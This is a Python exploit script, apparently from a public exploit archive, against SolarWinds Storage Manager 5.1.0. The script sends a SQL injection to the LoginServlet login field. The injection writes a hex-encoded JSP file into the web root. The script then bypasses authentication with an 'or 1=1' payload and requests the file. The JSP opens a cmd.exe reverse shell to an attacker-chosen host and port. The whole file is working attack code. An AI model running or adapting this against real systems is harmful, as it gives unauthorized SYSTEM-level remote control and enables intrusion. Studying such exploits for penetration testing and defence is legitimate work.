#!/usr/bin/python
# coding=utf-8
##########################################################################
# Exploit Title: Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit
# Date: May 2nd 2012
# Author: muts
# Version: SolarWinds Storage Manager 5.1.0
# Tested on: Windows 2003
# Archive Url : http://www.offensive-security.com/0day/solarshell.txt
##########################################################################
# Discovered by Digital Defence - DDIVRT-2011-39
##########################################################################


import ntpath
import random
import binascii

try:  # Py2
    from cookielib import CookieJar
    from urllib2 import build_opener, HTTPCookieProcessor
    from urllib import urlencode
except ImportError:  # Py3
    from http.cookiejar import CookieJar
    from urllib.request import build_opener, HTTPCookieProcessor
    from urllib.parse import urlencode

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

print("\n[*] Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit")
print("[*] Vulnerability discovered by Digital Defence - DDIVRT-2011-39")

print("[*] Offensive Security - http://www.offensive-security.com\n")

# if (len(sys.argv) != 4):
#    print "[*] Usage: solarshell.py <RHOST> <LHOST> <LPORT>"
#    exit(0)

# rhost = sys.argv[1]
# lhost = sys.argv[2]
# lport = sys.argv[3]

rhost = input("Enter the remote host IP address: ")
lhost = input("Enter the attacker IP address: ")
lport = input("Enter the local port: ")

filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890', 6):
    filename += i
filename += ".jsp"

output_path = ntpath.join("c:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/", filename)

jsp = '''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
    class StreamConnector extends Thread
    {{
        InputStream is;
        OutputStream os;

        StreamConnector( InputStream is, OutputStream os )
        {{
        this.is = is;
        this.os = os;
        }}

        public void run()
        {{
        BufferedReader in  = null;
        BufferedWriter out = null;
try
{{
    in  = new BufferedReader( new InputStreamReader( this.is ) );
    out = new BufferedWriter( new OutputStreamWriter( this.os ) );
    char buffer[] = new char[8192];
    int length;
    while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
    {{
        out.write( buffer, 0, length );
        out.flush();
    }}
}} catch( Exception e ){{}}
try
{{
    if( in != null )
        in.close();
    if( out != null )
        out.close();
}} catch( Exception e ){{}}
        }}
    }}

    try
    {{
        Socket socket = new Socket( "''{lhost}''", ''{lport}'');
        Process process = Runtime.getRuntime().exec( "cmd.exe" );
        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
    }} catch( Exception e ) {{}}
%>'''.format(lhost=lhost, lport=lport)

jsp = jsp.replace("\n", "")
jsp = jsp.replace("\t", "")

prepayload = "AAA' "
prepayload += 'union select 0x{0},2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile "{1}"'.format(binascii.hexlify(jsp.encode('ascii')), output_path)
prepayload += "#"
postpayload = "1' or 1=1#--"
loginstate = 'checkLogin'
password = 'OHAI'

cj = CookieJar()

opener = build_opener(HTTPCookieProcessor(cj))
post_params = urlencode({'loginState': loginstate, 'loginName': prepayload, 'password': password})
print("[*] Sending evil payload")
opener.open("http://{0}:9000/LoginServlet".format(rhost), post_params.encode())
print("[*] Triggering shell")
post_params = urlencode({'loginState': loginstate, 'loginName': postpayload, 'password': password})
opener.open("http://{0}:9000/LoginServlet".format(rhost), post_params.encode())
opener.open("http://{0}:9000/{1}".format(rhost, filename))
print("[*] Check your shell on {0} {1}\n".format(lhost, lport))

# 01010011 01101100 01100101 01100101 01110000 01101001 01110011 01101111
# 01110110 01100101 01110010 01110010 01100001 01110100 01100101 01100100
